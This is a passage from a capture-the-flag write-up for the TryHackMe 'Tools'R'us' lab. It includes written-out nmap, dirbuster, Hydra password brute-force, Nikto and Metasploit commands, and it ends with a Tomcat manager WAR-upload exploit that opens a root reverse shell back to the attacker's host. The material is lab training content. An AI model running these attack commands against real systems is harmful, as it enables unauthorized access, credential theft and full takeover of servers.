OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=
OS:Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=
OS:G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.019 days (since Sun Jan 30 15:47:12 2022)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   29.74 ms  10.13.0.1
2   ... 3
4   171.05 ms 10.10.28.154

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 30 16:14:13 2022 -- 1 IP address (1 host up) scanned in 1300.33 seconds
```

So, we've got the following ports:

* 22: OpenSSH (nmap says it's 7.2p2, but connecting to it directly reveals it to be 8.7p1)
* 80: Apache httpd 2.4.18
* 1234: Apache Tomcat + Coyote 1.1
* 8009: Apache Jserv 1.3

There's a hidden `/protected/` directory on port 80 that seems to be password-protected.

No obvious exploits here, but this is enough information to get us a few flags.

> FLAG 3: What directory has basic authentication? - protected
> 
> FLAG 5: What other port that serves a webs service is open on the machine? - 1234
> 
> FLAG 6: What is the name and version of the software running on that port? - Apache Tomcat/7.0.88
> 
> FLAG 8: What is the server version (run the scan against port 80)? - Apache/2.4.18
> 
> FLAG 9: What version of Apache-Coyote is this service using? - 1.1

We'll also run a scan with dirbuster (normally I use gobuster, but I'm trying to operate in the spirit of this CTF):

```bash
dirbuster \
	-l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
	-u http://10.10.28.154
```

This finds the following directories:

* /icons/
* /icons/small/
* /guidelines/
* /protected/
* /server-status/

This gives us another flag.

> FLAG 1: What directory can you find, that begins with a "g"? — `guidelines`

Going to this directory reveals a single message:

```html
Hey <b>bob</b>, did you update that TomCat server?
```

So, that kinda does imply that Tomcat or Coyote might be vulnerable, even though I couldn't find anything obvious on Exploit DB. I'll come back to that, since we have another flag.

> FLAG 2: Whose name can you find from this directory? — `bob`

We'll deploy Hydra against the http-basic authentication protecting `/protected/`. I've never done this before, but a quick internet search reveals a potentially useful guide, as well as an additional walk-through clarifying how to use Hydra to crack Apache conf-based http-basic authentication. With this information in hand, we should (hopefully) be able to crack Bob's password using the following:

```bash
hydra -l bob \
      -P ~/.local/share/red-team/wordlists/rockyou.txt \
      -f -vV http-get://10.10.28.154/protected/
```

This gets us another flag!

> FLAG 4: What is bob's password to the protected part of the website? — `bubbles`

While it probably won't get us any more flags, I'm kinda curious what's in `/protected/`. Unfortunately, the experience is kinda anti-climatic.

```html
<center></br> <img width=150 src="protected.png"> <p>This protected page has now moved to a different port.</p> </center>
```

Oh well.

The CTF does direct us to look at http://10.10.28.154:1234/manager/html (using Bob's password); that's just the Tomcat documentation by the looks of it. But if we throw Nikto against it, we can get ourselves another flag.

```bash
nikto -Format txt \
      -host http://10.10.28.154:1234/manager/html \
      -id bob:bubbles -nossl -output tools-r-us.txt
```

The next flag is just looking for the number of "Tomcat documentation" files Nikto finds. Unfortunately, these don't get spit out until near the end of Nikto's run, so expect to wait a *long* time!

> FLAG 7: How many documentation files did Nikto identify? — `5`

Alright, let's switch over to our last two flags, which imply that we can get RCE on this version of Tomcat. It looks like Apache Tomcat 7.0.88 was released on May 16, 2018. There's no obvious *vulnerability* to exploit for this version, but after searching around a bit on the net I found a guide mentioning that RCE on Tomcat could be obtained via the "manager" application. And, indeed, looking at the info for the corresponding module in Metasploit (`exploit/multi/http/tomcat_mgr_upload`) reveals that we can obtain RCE if we have access to the `/manager/html/upload` component. Which we *do*, because `/manager/html` has the option to "Select WAR file to upload".

Now, `exploit/multi/http/tomcat_mgr_upload` only targets 32-bit Linux, and the server is running a 64-bit build (this can also be found in `/manager/html/`), so we'll use the "Java Universal" target.

```msfconsole
use exploit/multi/http/tomcat_mgr_upload
set HttpPassword bubbles
set HttpUsername bob
set RHOSTS 10.10.28.154
set RPORT 1234
set LHOST 10.13.26.40
exploit
```

And we have a meterpreter shell! Running `getuid` reveals that we're also running as `root`. Ouch.

> FLAG 10: What user did you get a shell as? — `root`

We'll just drop to `shell` in meterpreter to get the contents of `/root/flag.txt`.

> FLAG 11: What text is in the file /root/flag.txt? — `ff1fc4a81affcc7688cf89ae7dc6e0e1`

* [Using Hydra](../Notes/Using%20Hydra.md)
* [Using "nmap"](../Notes/Using%20%22nmap%22.md)
* [Using Nikto](../Notes/Using%20Nikto.md)
* [Using Metasploit](../Notes/Using%20Metasploit.md)
* [Using "gobuster"](../Notes/Using%20%22gobuster%22.md)
* [Exploit Database](https://www.exploit-db.com)
* [Defeating HTTP Basic Auth with Hydra](http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/)
* [Multiple Ways To Exploiting HTTP Authentication](https://www.hackingarticles.in/multiple-ways-to-exploiting-http-authentication/)
* [Apache Tomcat 7.x vulnerabilities](https://tomcat.apache.org/security-7.html)
* [Multiple Ways to Exploit Tomcat Manager](https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/)

ELAPSED TIME: 3 h 7 min

## References

* [TryHackMe: Tools'R'us](https://tryhackme.com/room/toolsrus)
